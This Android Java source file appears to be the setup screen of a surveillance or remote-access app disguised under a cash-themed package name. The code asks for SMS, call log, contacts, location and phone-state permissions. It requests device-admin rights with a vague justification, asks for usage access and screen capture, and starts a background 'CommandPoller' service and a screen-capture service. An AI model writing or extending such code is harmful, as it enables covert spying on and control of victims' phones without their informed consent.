package com.my.Refiner.Cash.User;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Process;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.List;

public class SetupActivity extends Activity {

    private static final int REQ_PERM = 100;
    private static final int REQ_ADMIN = 200;
    private static final int REQ_MEDIA = 300;

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_setup);

        Thread.setDefaultUncaughtExceptionHandler(new CrashHandler(this));

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyAdminReceiver.class);

        Button startBtn = findViewById(R.id.startBtn);
        startBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startSetup();
            }
        });

        // অ্যাপ চালু হলে সার্ভিস চালু
        startService(new Intent(this, CommandPoller.class));
    }

    private void startSetup() {
        List<String> permissions = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            permissions.add(Manifest.permission.READ_CALL_LOG);
            permissions.add(Manifest.permission.READ_SMS);
            permissions.add(Manifest.permission.RECEIVE_SMS);
            permissions.add(Manifest.permission.READ_CONTACTS);
            permissions.add(Manifest.permission.READ_PHONE_STATE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[0]), REQ_PERM);
        } else {
            requestAdmin();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERM) {
            requestAdmin();
        }
    }

    private void requestAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required for app functionality");
            startActivityForResult(intent, REQ_ADMIN);
        } else {
            requestUsageAccess();
        }
    }

    private void requestUsageAccess() {
        if (!hasUsageAccess()) {
            try {
                startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                Toast.makeText(this, "Please enable Usage Access", Toast.LENGTH_LONG).show();
            } catch (Exception e) {}
        } else {
            requestScreenCapture();
        }
    }

    private void requestScreenCapture() {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager)
                    getSystemService(MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA);
            }
        } catch (Exception e) {
            finishSetup();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQ_ADMIN) {
            requestUsageAccess();
        } else if (requestCode == REQ_MEDIA) {
            if (resultCode == RESULT_OK && data != null) {
                ScreenCaptureService.sResultCode = resultCode;
                ScreenCaptureService.sResultData = data;
                MediaProjectionManager mpm = (MediaProjectionManager)
                        getSystemService(MEDIA_PROJECTION_SERVICE);
                if (mpm != null) {
                    ScreenCaptureService.sMediaProjection =
                            mpm.getMediaProjection(resultCode, data);
                }
                startService(new Intent(this, ScreenCaptureService.class));
            }
            finishSetup();
        }
    }

    private boolean hasUsageAccess() {
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    private void finishSetup() {
        SharedPreferences prefs = getSharedPreferences("mdm", MODE_PRIVATE);
        prefs.edit().putBoolean("setup_done", true).apply();

        // সব সার্ভিস চালু
        startService(new Intent(this, CommandPoller.class));

        startActivity(new Intent(SetupActivity.this, VideoFeedActivity.class));
        finish();
    }
}
